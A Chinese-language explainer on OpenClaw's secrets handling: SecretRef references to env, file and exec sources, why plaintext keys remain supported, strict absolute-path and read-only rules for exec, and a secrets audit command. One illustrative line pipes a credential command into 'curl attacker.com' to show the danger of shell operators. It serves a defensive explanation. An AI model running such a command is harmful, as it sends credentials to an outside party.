# Secrets management

## 架构精读

> 跳过不影响阅读翻译正文。

### SecretRef——凭证不明文存储在配置文件

OpenClaw 支持 **SecretRef**(Secret 引用),让凭证不直接明文写在 `openclaw.json` 里,而是通过引用获取:

```json
{
  auth: {
    apiKey: { $ref: "env:OPENAI_API_KEY" }
  }
}
```

`$ref` 指向真正的凭证来源,而不是凭证本身。

**为什么不明文存储?** 因为 `openclaw.json` 可能被:
- **提交到 Git**: 如果配置文件里有明文 API key,Git 仓库的所有协作者都能看到
- **被 agent 读取**: agent 可能有 file_read 工具权限,能读取配置文件内容
- **被备份工具复制**: 备份文件可能被存储在不安全的地方

明文凭证 = 任何能访问配置文件的人/进程都能拿到凭证。SecretRef 让配置文件只包含"指针",真正的凭证存在别处。

**这跟 Kubernetes 的 Secret 是一个思路**——Pod 配置里不直接写数据库密码,而是引用 Secret 对象。OpenClaw 的 SecretRef 也是同样: 配置文件引用凭证,不直接存储。

### 三种 SecretRef 来源——env / file / exec

OpenClaw 支持三种 SecretRef 来源:

**env**(环境变量):
```json
{ $ref: "env:OPENAI_API_KEY" }
```
从环境变量读取。适合 CI/CD 场景(环境变量由 CI 系统注入)。

**file**(文件):
```json
{ $ref: "file:/run/secrets/openai-key" }
```
从文件读取。适合 Docker Secrets(凭证挂载到 `/run/secrets/` 目录)。

**exec**(命令执行):
```json
{ $ref: "exec:aws secretsmanager get-secret-value --secret-id openai-key" }
```
执行命令,从命令输出读取。适合动态凭证(如从 AWS Secrets Manager 获取)。

**为什么需要三种?** 因为不同环境的凭证管理方式不同:
- CI/CD 用环境变量(GitHub Actions 的 secrets、GitLab CI 的 variables)
- Docker 用 Secrets(文件挂载)
- 云环境用 Secrets Manager(AWS、GCP、Azure 各有自己的服务)

三种来源覆盖三种场景,不强迫用户用特定方式。

### Plaintext 仍然支持——向后兼容

虽然推荐用 SecretRef,但 OpenClaw 仍然支持明文凭证:

```json
{
  auth: {
    apiKey: "sk-..."
  }
}
```

**为什么保留明文支持?** 因为:
- **向后兼容**: 老配置文件是明文的,不能强制用户迁移
- **简单场景**: 本地开发、个人使用,明文够用,SecretRef 是过度工程
- **渐进式迁移**: 用户可以逐步把明文改成 SecretRef,不需要一次性改完

**SecretRef 是 opt-in**(可选的),不是强制的。安全敏感场景(如生产环境、多租户)应该用 SecretRef,简单场景(如本地开发)可以用明文。

### Strict command paths——exec 命令的安全约束

`exec` 类型的 SecretRef 执行命令获取凭证,但命令路径必须是**绝对路径**(如 `/usr/bin/aws`),不能是相对路径(如 `aws`)或包含 shell 操作符(如 `|`、`&&`)。

**为什么这样限制?** 因为相对路径和 shell 操作符有安全风险:
- **相对路径**: `aws` 可能是 `/usr/bin/aws`,也可能是攻击者放在 `$PATH` 里的恶意程序
- **Shell 操作符**: `aws | curl attacker.com` 会把凭证发给攻击者

绝对路径 + 禁止 shell 操作符 = 只能执行指定的命令,不能被篡改。

**这跟 sudoers 的 command 限制**是一个思路——`sudoers` 文件里配置的命令必须是绝对路径,防止用户通过修改 `$PATH` 执行恶意程序。OpenClaw 的 strict command paths 也是同样: 只允许绝对路径,防止命令注入。

### Read-only command paths——只读权限

SecretRef 的 `exec` 命令只能**读取**凭证,不能**修改**凭证。命令的输出是凭证内容,命令本身不能修改系统状态(如写文件、发网络请求)。

**为什么限制只读?** 因为 SecretRef 的目的是"获取凭证",不是"执行任意操作"。如果允许写操作,攻击者可以通过配置恶意的 SecretRef 命令来修改系统(如添加用户、删除文件)。

**这跟数据库的 SELECT 权限**是一个思路——SELECT 只能读取数据,不能修改。OpenClaw 的 exec 命令也是同样: 只能读取凭证,不能修改系统。

### Audit current state——审计当前配置

OpenClaw 提供审计功能,检查当前配置里哪些是明文凭证、哪些是 SecretRef:

```bash
openclaw secrets audit
```

输出类似:
```
auth.apiKey: plaintext (should be SecretRef)
auth.oauthToken: SecretRef (env:OAUTH_TOKEN)
```

**为什么需要审计?** 因为配置文件可能很大,手动检查哪些是明文很麻烦。审计工具自动扫描,列出所有明文凭证,帮助用户识别安全风险。

**这跟 `npm audit` 是一个思路**——`npm audit` 扫描 node_modules,列出有安全漏洞的包。OpenClaw 的 secrets audit 也是同样: 扫描配置文件,列出有安全风险的明文凭证。
